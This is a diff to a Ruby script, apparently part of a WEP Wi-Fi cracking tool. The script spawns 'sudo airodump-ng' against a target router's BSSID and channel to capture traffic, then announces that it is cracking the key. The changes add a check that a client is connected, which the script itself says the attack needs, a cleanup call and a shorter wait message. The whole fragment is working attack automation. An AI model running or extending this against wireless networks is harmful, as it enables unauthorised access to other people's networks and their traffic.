@@ -1,11 +1,18 @@
 require 'timeout'
 require './router.rb'
+require './cleaner.rb'
 
 def wep_handler r = Router.new
+	
+	if r.stations[0].nil?
+		system("clear")
+		abort("Error: No stations found\nNote: In order for this attack to work someone has to be using the router.\n")
+	end
 	
 	# Begin Loop
 	begin
 	
+		cleaner()
 		p_airodump = Process.spawn("sudo airodump-ng mon0 --bssid #{r.bssid} -c #{r.channel} -w wepper")
 		begin
 			Timeout.timeout(200) do
@@ -35,7 +42,7 @@ def wep_handler r = Router.new
 
 		system("clear")
 		puts "Cracking key, please wait..."
-		puts "This will take some time, better go take a drink. ^w^"
+		puts "This will take around a minute."
 		puts "Press Enter to continue..."
 		gets.chomp
 	
